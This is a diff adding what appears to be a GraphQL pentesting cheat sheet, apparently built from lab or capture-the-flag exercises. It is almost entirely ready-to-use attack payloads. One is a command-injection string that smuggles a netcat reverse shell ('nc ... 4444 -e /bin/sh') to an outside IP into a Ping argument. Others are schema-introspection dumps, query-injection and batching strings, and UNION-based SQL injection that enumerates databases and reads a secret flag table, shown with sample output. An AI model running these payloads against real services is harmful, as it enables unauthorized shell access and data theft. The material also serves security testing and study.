@@ -1,0 +1,70 @@
+### graphQL ###
+## links
+# plugin : https://altair.sirmuel.design/
+
+
+
+###############
+### Example ###
+###############
+## test if it is graphql
+{__typename}							# expect {"__typename": "Query"}
+{thisdefinitelydoesnotexist}					# check if error is outputed
+
+## rce example
+{ Ping(ip: "10.10.93.166; nc 10.8.98.114 4444 -e /bin/sh"){ output}}
+
+## introspection, query __schema field
+{__schema{types{name,fields{name}}}}				# output schema
+{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}
+								# get all types, fields, arg
+{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
+
+
+## query
+{flags{name,value}}						# field name/val of types "flags"
+{user(uid:1){user,password}}					# query with arg (uid:1)
+
+{__type(name:"Object"){fields{name}}}				# enum an object
+
+
+
+###############
+## injection ##
+###############
+q=France"){name}}#								# close query
+q=France"){id,name,country,is_active}}#						# try req field
+q=France"){name,country}second:rockets(country:"France"){name,country}}#	# try batch query
+q=France"){name,country}second:__typename}#					# batch introspect
+q=France"){name,country}second:__schema{types{name,fields{name}}}}#		# output schema
+q=France"){name,country}second:__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}#
+q=France"){name,country}second:HackerInSpace(hacker_id:1){hacker_value}}#	# get other object
+
+
+
+##########
+## GQLi ##
+##########
+"{rocket(id:\"0 UNION SELECT 1,database(),3,4\"){name,country}}"		# graphql_db
+										# 10.8.2-MariaDB-1:10.8.2+maria~focal
+"{rocket(id:\"0 UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata\"){name,country}}"
+	information_schema,graphql_db,secret_db
+"{rocket(id:\"0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=0x7365637265745f6462\"){name,country}}"
+	flag
+"{rocket(id:\"0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name=0x666c6167\"){name,country}}"
+	id,value
+"{rocket(id:\"0 UNION SELECT id,value,3,4 FROM secret_db.flag\"){name,country}}"
+
+
+
+##############
+## Mutation ##
+##############
+mutation{createComment(userId:1,postId:1,nudeId:2,comment:\"test\"){id,nude{id,flag}}}
+mutation someName {createComment(userId:1,postId:1,nudeId:2,comment:\"test\"){id,nude{id,flag}}}
+
+
+
+
+
+
